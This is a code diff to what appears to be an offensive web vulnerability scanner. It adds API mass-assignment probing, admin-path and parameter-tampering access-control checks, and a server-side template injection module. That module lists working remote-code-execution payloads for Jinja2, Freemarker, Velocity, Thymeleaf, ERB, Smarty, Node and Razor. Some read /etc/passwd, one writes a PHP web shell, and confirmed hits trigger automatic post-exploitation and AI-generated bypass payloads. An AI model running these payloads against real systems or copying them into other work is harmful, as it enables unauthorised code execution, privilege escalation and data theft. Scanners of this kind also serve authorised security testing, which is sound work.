@@ -5951,6 +5951,368 @@ async def check_graphql_injection(target, output, tech, report, session_cookies=
     
     output.print("  [INFO] GraphQL Injection scan completed.")
 
+# --- [NEW] 20. Advanced API Security Testing ---
+async def check_api_security(target, output, tech, report, session_cookies=None):
+    output.print(f"\n[+] Starting Advanced API Security Scan...")
+    base_url = normalize_target(target)
+
+    api_schema_paths = [
+        "/swagger.json", "/openapi.json", "/swagger/v1/swagger.json", "/api/swagger.json",
+        "/api/v1/swagger.json", "/api/docs/swagger.json", "/swagger-ui.html", "/api-docs",
+        "/openapi.yaml", "/swagger.yaml", "/api.yaml", "/api/v1/api.yaml",
+        "/?wsdl", "/service.svc?wsdl", "/api/service?wsdl"
+    ]
+
+    sensitive_keywords = [
+        "password", "secret", "apiKey", "api_key", "token", "auth_token", "session",
+        "privateKey", "private_key", "creditCard", "ssn", "social_security_number"
+    ]
+
+    mass_assignment_payloads = {
+        "isAdmin": True, "is_admin": True, "admin": True, "role": "admin",
+        "is_superuser": True, "superuser": True, "access_level": 0,
+        "account_balance": 999999, "isPremium": True, "is_premium": True
+    }
+
+    schema_found = False
+    for path in api_schema_paths:
+        schema_url = urljoin(base_url, path)
+        res, _, _ = await _send_async_http_request(schema_url, output=output, session_cookies=session_cookies)
+
+        if res and res.status == 200:
+            content_type = res.headers.get('Content-Type', '').lower()
+            response_text = await res.text()
+
+            if 'swagger' in response_text.lower() or 'openapi' in response_text.lower() or 'wsdl:definitions' in response_text.lower():
+                output.print(f"  [HIGH] Found potential API schema/documentation at: {schema_url}")
+                schema_found = True
+                report.add_finding(
+                    "API Schema/Documentation Exposed", "Medium", schema_url, "N/A", "N/A",
+                    "Publicly exposed API documentation can provide attackers with a detailed map of the application's API structure, including endpoints, parameters, and data models, accelerating targeted attacks.",
+                    "Ensure that API documentation is not exposed in production environments. If necessary, protect it with authentication and authorization.",
+                    f"Schema URL: {schema_url}\nContent Snippet:\n{response_text[:300]}..."
+                )
+
+                # --- Parse schema and test endpoints ---
+                try:
+                    # Simple regex-based parsing for paths and methods
+                    # This is a heuristic and won't cover all schema structures, but avoids complex dependencies
+                    endpoints = re.findall(r'["\'](/[^"\']+)["\']\s*:', response_text)
+                    for endpoint in set(endpoints):
+                        endpoint_url = urljoin(base_url, endpoint)
+                        
+                        # 1. Test for Excessive Data Exposure
+                        output.print(f"    [*] Checking for excessive data exposure on: GET {endpoint_url}")
+                        res_get, _, _ = await _send_async_http_request(endpoint_url, method='GET', output=output, session_cookies=session_cookies)
+                        if res_get and res_get.status == 200:
+                            get_response_text = await res_get.text()
+                            found_leaks = [keyword for keyword in sensitive_keywords if f'"{keyword}"' in get_response_text or f"'{keyword}'" in get_response_text]
+                            if found_leaks:
+                                output.print(f"      [HIGH] Potential sensitive data exposure found at {endpoint_url}. Keywords: {found_leaks}")
+                                report.add_finding(
+                                    "API Excessive Data Exposure", "High", endpoint_url, "Response Body", ", ".join(found_leaks),
+                                    "The API endpoint appears to be returning sensitive data (e.g., password hashes, keys) that should not be exposed to the client.",
+                                    "Review the serialization logic for this endpoint and remove any sensitive fields from the API response.",
+                                    f"Endpoint: {endpoint_url}\nLeaked Keywords: {found_leaks}\nResponse Snippet:\n{get_response_text[:500]}..."
+                                )
+
+                        # 2. Test for Mass Assignment
+                        output.print(f"    [*] Checking for mass assignment on: POST {endpoint_url}")
+                        # Get a baseline response without the malicious data
+                        baseline_data = {"test": "data"}
+                        res_baseline, _, _ = await _send_async_http_request(endpoint_url, method='POST', data=json.dumps(baseline_data), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+                        
+                        # Send request with mass assignment payloads
+                        malicious_data = baseline_data.copy()
+                        malicious_data.update(mass_assignment_payloads)
+                        
+                        res_mass, req_details, resp_details = await _send_async_http_request(endpoint_url, method='POST', data=json.dumps(malicious_data), headers={'Content-Type': 'application/json'}, output=output, session_cookies=session_cookies)
+                        
+                        if res_mass and res_baseline and res_mass.status == res_baseline.status:
+                            # If the response content changes significantly, it might be vulnerable
+                            if abs(len(await res_mass.text()) - len(await res_baseline.text())) > 50:
+                                output.print(f"      [HIGH] Potential Mass Assignment vulnerability found at {endpoint_url}.")
+                                report.add_finding(
+                                    "API Mass Assignment", "High", endpoint_url, "Request Body", json.dumps(mass_assignment_payloads),
+                                    "The API endpoint appears to process and persist unauthorized fields (e.g., 'isAdmin'), potentially allowing for privilege escalation or data tampering.",
+                                    "Use a strict allow-list (DTOs - Data Transfer Objects) to define which fields are updatable. Do not bind incoming data directly to model objects.",
+                                    f"Endpoint: {endpoint_url}\nPayload Sent: {json.dumps(malicious_data)}\nResponse length changed significantly compared to baseline, suggesting the server processed the extra fields.",
+                                    method="POST", request_details=req_details, response_details=resp_details
+                                )
+
+                except Exception as e:
+                    output.print(f"    [ERROR] Failed to parse or test endpoints from schema {schema_url}: {e}")
+
+    if not schema_found:
+        output.print("  [INFO] No common API schema files found.")
+        report.add_check("Advanced API Security Scan", "No schema found")
+    else:
+        report.add_check("Advanced API Security Scan", "Completed")
+
+    output.print("  [INFO] Advanced API Security scan completed.")
+
+
+# --- [NEW] 18. Server-Side Template Injection (SSTI) ---
+async def check_ssti(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
+    output.print(f"\n[+] Starting Hybrid Server-Side Template Injection (SSTI) Scan...")
+    
+    # Payloads designed to evaluate to a unique, easily searchable string: 49
+    ssti_probes = [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "@{7*7}",
+        "{{'7'*7}}", "{{7*'7'}}", # String multiplication for some engines
+    ]
+
+    # Comprehensive list of payloads for various template engines
+    ssti_payloads = [
+        # Generic
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
+        # Jinja2 / Twig (Python/PHP)
+        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+        "{{ ''.__class__.__mro__[1].__subclasses__()[_].__init__.__globals__['os'].popen('id').read() }}", # Needs index fuzzing
+        "{{ config.items() }}",
+        "{{ settings.SECRET_KEY }}",
+        "{{ request.application.__globals__['__builtins__'].open('/etc/passwd').read() }}",
+        # Freemarker (Java)
+        "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
+        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
+        # Velocity (Java)
+        "#set($x='')...#set($rt=$x.class.forName('java.lang.Runtime'))...#set($cm=$rt.getRuntime().exec('id'))..",
+        "#evaluate($x.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))",
+        # Pebble (Java)
+        "{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id').getInputStream().readAllBytes()|join(' ')}}",
+        # Thymeleaf (Java)
+        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
+        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+        # ERB (Ruby)
+        "<%= `id` %>", "<%= File.open('/etc/passwd').read %>",
+        # Smarty (PHP)
+        "{Smarty_Internal_Write_File::writeFile('/tmp/shell.php','<?php echo `id`;?>',self::clearConfig())}",
+        # Jade / Pug (Node.js)
+        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+        "#{process.mainModule.require('child_process').execSync('id')}",
+        # Handlebars (Node.js)
+        "{{#with 's' as |string|}}{{#with 'e'}}...{{/with}}{{/with}}", # Complex RCE chains
+        # ASP.NET Razor
+        "@{System.Diagnostics.Process.Start('cmd.exe','/c id').StandardOutput.ReadToEnd()}",
+        "@(1+1)",
+        # More polyglots and detection vectors
+        "{{'a'.toUpperCase()}}", "${'a'.toUpperCase()}",
+        "{{ some_object.inspect() }}",
+        "{{ [].class.base_classes[0].subclasses() }}",
+        "{{''.class.mro()}}",
+        *[f"{{{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('{cmd}').getInputStream().readAllBytes()|join(' ')}}}}" for cmd in ['whoami', 'uname -a']],
+        *[f"<%= `#{cmd}` %>" for cmd in ['whoami', 'uname -a']],
+        *[f"{{{{config.items()}}}}", "{{{{settings.items()}}}}", "{{{{app.config.items()}}}}"],
+    ]
+
+    async def run_ssti_test(point, payload):
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
+        res, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        
+        if not res or not await res.text():
+            return False, None
+
+        response_text = await res.text()
+        
+        # 1. Check for evaluated math expressions (e.g., 7*7=49)
+        if "49" in response_text and "{{7*7}}" not in response_text and "${7*7}" not in response_text:
+            output.print(f"  [CRITICAL] SSTI confirmed via math evaluation on param '{point['param']}' with payload: {payload}")
+            
+            # Attempt RCE post-exploitation
+            rce_evidence = ""
+            for rce_payload in [p for p in ssti_payloads if "popen('id').read()" in p or "`id`" in p or "exec('id')" in p]:
+                rce_url, rce_data = build_request(point['url'], point['method'], point['param'], point['value'] + rce_payload, point['form_data'], point['original_query'])
+                res_rce, req_rce, resp_rce = await _send_async_http_request(rce_url, method=point['method'], data=rce_data, output=output, session_cookies=session_cookies)
+                if res_rce and await res_rce.text() and "uid=" in await res_rce.text():
+                    output.print(f"    [SUCCESS] SSTI to RCE confirmed! Payload: {rce_payload}")
+                    rce_evidence = f"\n\n--- RCE Post-Exploitation ---\nPayload: {rce_payload}\nResponse Snippet: {(await res_rce.text())[:200]}\n---"
+                    break
+            
+            evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (showing '49') ---\n{response_text[:400]}\n---" + rce_evidence
+            report.add_finding("Server-Side Template Injection (SSTI)", "Critical", test_url, point['param'], payload,
+                               "The application is vulnerable to SSTI. A malicious payload was evaluated by the server's template engine, which can lead to Remote Code Execution (RCE).",
+                               "Do not use user-provided input to construct or modify server-side templates. Use sandboxed template engines if user input is unavoidable.",
+                               evidence, method=point['method'], request_details=request_details, response_details=response_details)
+            return True, "SSTI"
+        
+        # 2. Check for reflection of known sensitive object properties (e.g., config, settings)
+        if any(keyword in response_text for keyword in ['SECRET_KEY', 'DATABASE_URL', 'cycler', 'os', 'Runtime', 'passwd']):
+             output.print(f"  [HIGH] Potential SSTI confirmed via sensitive info leak on param '{point['param']}' with payload: {payload}")
+             evidence = f"Vulnerable URL: {test_url}\nPayload: {payload}\n\n--- Response Snippet (showing sensitive info) ---\n{response_text[:400]}\n---"
+             report.add_finding("Server-Side Template Injection (Info Leak)", "High", test_url, point['param'], payload,
+                               "The application appears vulnerable to SSTI, reflecting sensitive server-side objects or configurations.",
+                               "Do not use user-provided input to construct or modify server-side templates.",
+                               evidence, method=point['method'], request_details=request_details, response_details=response_details)
+             return True, "SSTI"
+
+        return False, None
+
+    # --- Main Orchestration Logic ---
+    attack_points = []
+    parsed_target = urlparse(target)
+    base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
+
+    # 1. Gather attack points
+    if parsed_target.query:
+        params = unquote(parsed_target.query).split('&')
+        for p_str in params:
+            if '=' in p_str:
+                param_name, value = p_str.split('=', 1)
+                attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
+    
+    if form_to_test:
+        action_url = urljoin(target, form_to_test['action'])
+        form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
+        for input_field in form_to_test['inputs']:
+            if input_field['type'] not in ['submit', 'hidden']:
+                attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': input_field['name'], 'value': input_field.get('value', 'test'), 'form_data': form_data, 'original_query': None})
+
+    if not attack_points:
+        output.print("  [*] No parameters found. Actively guessing common parameter names for SSTI...")
+        ssti_params = [p for p in COMMON_PARAM_NAMES if any(k in p for k in ['template', 'view', 'name', 'id', 'data', 'content', 'preview'])]
+        for param_name in ssti_params[:30]:
+            attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': '', 'form_data': None, 'original_query': None})
+
+    # 2. Execute attacks
+    for point in attack_points:
+        output.print(f"  [*] Testing SSTI on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
+        
+        # Phase 1: Smart Probing
+        vulnerability_found = False
+        for payload in ssti_probes:
+            found, vuln_type = await run_ssti_test(point, payload)
+            if found:
+                vulnerability_found = True
+                break
+        if vulnerability_found: continue
+
+        # Phase 2: AI Bypass
+        if ai_enabled:
+            output.print(f"  [Phase 2] Running AI-Assisted Bypass for SSTI on param '{point['param']}'...")
+            probe_payload = "{{7*7}}"
+            test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+            res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+            response_snippet = (await res.text())[:500] if res and await res.text() else "No response from server."
+            
+            ai_payloads = await ai_generate_dynamic_payloads("SSTI", probe_payload, response_snippet, output)
+            for payload in ai_payloads:
+                found, vuln_type = await run_ssti_test(point, payload)
+                if found:
+                    vulnerability_found = True
+                    break
+            if vulnerability_found: continue
+
+        # Phase 3: Full Scan
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for SSTI on param '{point['param']}'...")
+        for payload in ssti_payloads:
+            found, vuln_type = await run_ssti_test(point, payload)
+            if found:
+                vulnerability_found = True
+                break
+        
+        if not vulnerability_found:
+            report.add_check(f"SSTI Check on param '{point['param']}' at {point['url']}", "No vulnerability found")
+
+    output.print("  [INFO] SSTI scan completed.")
+
+# --- [NEW] 19. Broken Access Control (BAC) ---
+async def check_bac(target, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None):
+    output.print(f"\n[+] Starting Broken Access Control (BAC) / Privilege Escalation Scan...")
+    
+    if not session_cookies:
+        output.print("  [INFO] BAC scan requires an authenticated session. Skipping as no session cookies were provided.")
+        report.add_check("Broken Access Control Scan", "Skipped (No session)")
+        return
+
+    base_url = normalize_target(target)
+    
+    admin_paths = [
+        "/admin", "/dashboard", "/admin/dashboard", "/admin/settings", "/admin/users", "/manage", "/config",
+        "/admin.php", "/admin.html", "/admin/index.php", "/api/admin", "/api/users", "/api/v1/admin",
+        "/system", "/controlpanel", "/cpanel", "/admin/home", "/user/admin", "/admin/panel", "/apanel",
+        "/admin/login", "/admin/auth", "/management", "/webadmin", "/admin/console", "/console",
+        "/admin/manage_users", "/admin/config", "/admin/reports", "/admin/view_logs", "/api/private",
+        "/internal", "/backoffice", "/godmode", "/superuser", "/admin/profile", "/admin/edit",
+    ]
+
+    # Phase 1: Vertical Privilege Escalation (Direct Access)
+    output.print("  [Phase 1] Probing for direct access to common admin paths...")
+    vulnerable_endpoints = set()
+
+    # Combine discovered URLs with common admin paths for a comprehensive list
+    urls_to_test = set(discovered_urls or [])
+    for path in admin_paths:
+        urls_to_test.add(urljoin(base_url, path))
+
+    for url in urls_to_test:
+        # Skip logout links to avoid invalidating the session
+        if "logout" in url.lower() or "signout" in url.lower():
+            continue
+
+        res, request_details, response_details = await _send_async_http_request(url, output=output, session_cookies=session_cookies)
+        
+        if res and res.status == 200:
+            response_text = await res.text()
+            # Check for keywords indicating successful access to an admin area
+            if any(keyword in response_text.lower() for keyword in ["dashboard", "admin panel", "manage users", "system settings", "control panel"]):
+                if url not in vulnerable_endpoints:
+                    output.print(f"  [HIGH] Potential Vertical Privilege Escalation. Authenticated user can access: {url}")
+                    evidence = f"Accessed admin-like URL '{url}' with a standard user session and received a 200 OK response.\n\nResponse Snippet:\n---\n{response_text[:300]}\n---"
+                    report.add_finding("Broken Access Control - Vertical Privilege Escalation", "High", url, "N/A", "Direct Access",
+                                       "An authenticated user can directly access an administrative endpoint, indicating a lack of function-level access control.",
+                                       "Implement strict, deny-by-default access control checks on the server-side for every sensitive endpoint and function, verifying the user's role and permissions.",
+                                       evidence, method="GET")
+                    vulnerable_endpoints.add(url)
+
+    # Phase 2: Parameter-based Privilege Escalation
+    output.print("  [Phase 2] Probing for parameter-based privilege escalation...")
+    
+    attack_points = []
+    if discovered_urls:
+        for url in discovered_urls:
+            if urlparse(url).query:
+                params = unquote(urlparse(url).query).split('&')
+                for p_str in params:
+                    if '=' in p_str:
+                        param_name, value = p_str.split('=', 1)
+                        attack_points.append({'url': url, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': urlparse(url).query})
+
+    if discovered_forms:
+        for form in discovered_forms:
+            action_url = urljoin(target, form['action'])
+            form_data = {i['name']: i.get('value', 'test') for i in form['inputs']}
+            for input_field in form['inputs']:
+                attack_points.append({'url': action_url, 'method': form['method'], 'param': input_field['name'], 'value': input_field.get('value', 'test'), 'form_data': form_data, 'original_query': None})
+
+    privilege_params = ['isAdmin', 'is_admin', 'admin', 'role', 'access_level', 'user_type', 'is_superuser']
+    
+    for point in attack_points:
+        if point['param'] in privilege_params:
+            output.print(f"  [*] Testing privilege parameter '{point['param']}' at {point['url']}")
+            
+            # Get original response
+            res_orig, _, _ = await _send_async_http_request(point['url'], method=point['method'], data=point['form_data'], output=output, session_cookies=session_cookies)
+            if not res_orig: continue
+            
+            # Test with tampered values
+            for tampered_value in ['true', '1', 'admin', 'administrator', 'superuser']:
+                test_url, test_data = build_request(point['url'], point['method'], point['param'], tampered_value, point['form_data'], point['original_query'])
+                res_tampered, req_details, resp_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+                
+                if res_tampered and res_tampered.status == 200:
+                    # Compare original and tampered responses
+                    if abs(len(await res_orig.text()) - len(await res_tampered.text())) > 100: # Significant content change
+                        output.print(f"  [HIGH] Potential Parameter-Based Privilege Escalation on param '{point['param']}' with value '{tampered_value}'")
+                        evidence = f"Tampering parameter '{point['param']}' with value '{tampered_value}' resulted in a significantly different response, suggesting a privilege escalation.\n\nOriginal Response Length: {len(await res_orig.text())}\nTampered Response Length: {len(await res_tampered.text())}"
+                        report.add_finding("Broken Access Control - Parameter-Based Escalation", "High", test_url, point['param'], tampered_value,
+                                           "The application appears to trust user-controllable parameters to determine access rights, allowing for privilege escalation.",
+                                           "Do not rely on client-side parameters for access control. User roles and permissions should be managed and verified exclusively on the server-side based on the user's session.",
+                                           evidence, method=point['method'], request_details=req_details, response_details=resp_details)
+                        break # Move to next point
+
+    output.print("  [INFO] Broken Access Control scan completed.")
+
+
 # --- [NEW] 18. CSRF ---
 async def check_csrf(target, form_to_test, output, tech, report, session_cookies=None, discovered_urls=None, discovered_forms=None):
     output.print(f"\n[+] Starting Enhanced CSRF Scan...")
@@ -6290,7 +6652,9 @@ async def ai_analyze_scan_results(base_url, tech, report, discovered_urls, disco
             "check_xxe": ['xxe', 'xml external entity'],
             "check_csrf": ['csrf', 'cross-site request forgery'],
             "check_file_inclusion": ['file inclusion', 'lfi', 'rfi'],
-            "brute_force_login": ['brute force', 'weak credentials', 'login']
+            "brute_force_login": ['brute force', 'weak credentials', 'login'],
+            "check_ssti": ['ssti', 'server-side template injection', 'template injection'],
+            "check_bac": ['bac', 'broken access control', 'privilege escalation', 'authorization bypass']
         }
 
         for func_name, keywords in attack_map.items():
@@ -6592,13 +6956,13 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
     # 1. Categorize attacks
     target_level_attacks = [
         scan_exposed_services, scan_and_exploit_mongodb, scan_rtsp, 
-        check_http_smuggling, check_graphql_injection, scan_react2shell
+        check_http_smuggling, check_graphql_injection, scan_react2shell, check_api_security
     ]
     url_level_attacks = [
         check_sql_injection, check_xss, check_command_injection, check_idor, 
         check_ldap_injection, check_insecure_deserialization, check_cors, 
         check_crlf, check_open_redirect, check_ssrf, check_xxe, check_csrf, 
-        check_file_inclusion, brute_force_login
+        check_file_inclusion, brute_force_login, check_ssti, check_bac
     ]
 
     # 2. Handle scan_type selection
@@ -6863,12 +7227,15 @@ if __name__ == '__main__':
         print("    5: LFI Scan")
         print("    6: CMDi Scan")
         print("    7: RCE Scan")
+        print("    8: SSTI Scan")
+        print("    9: BAC Scan (Broken Access Control)")
         
-        scan_type_choice = input("  Enter your choice (1-7): ")
+        scan_type_choice = input("  Enter your choice (1-9): ")
         
         scan_type_map = {
             '1': 'full', '2': 'exposed_services', '3': 'xss',
-            '4': 'sqli', '5': 'lfi', '6': 'cmdi', '7': 'rce'
+            '4': 'sqli', '5': 'lfi', '6': 'cmdi', '7': 'rce', '8': 'ssti',
+            '9': 'bac'
         }
         
         selected_scan_type = scan_type_map.get(scan_type_choice, 'full')
@@ -6890,8 +7257,10 @@ if __name__ == '__main__':
         print("    5: LFI Scan")
         print("    6: CMDi Scan")
         print("    7: RCE Scan")
+        print("    8: SSTI Scan")
+        print("    9: BAC Scan (Broken Access Control)")
         
-        scan_type_choice = input("  Enter your choice (1-7): ")
+        scan_type_choice = input("  Enter your choice (1-9): ")
         scan_type_map = {
             '1': 'full',
             '2': 'exposed_services',
@@ -6899,7 +7268,9 @@ if __name__ == '__main__':
             '4': 'sqli',
             '5': 'lfi',
             '6': 'cmdi',
-            '7': 'rce'
+            '7': 'rce',
+            '8': 'ssti',
+            '9': 'bac'
         }
         selected_scan_type = scan_type_map.get(scan_type_choice, 'full')
         print(f"  [INFO] Selected Classic Scan Type: {selected_scan_type.upper()}")
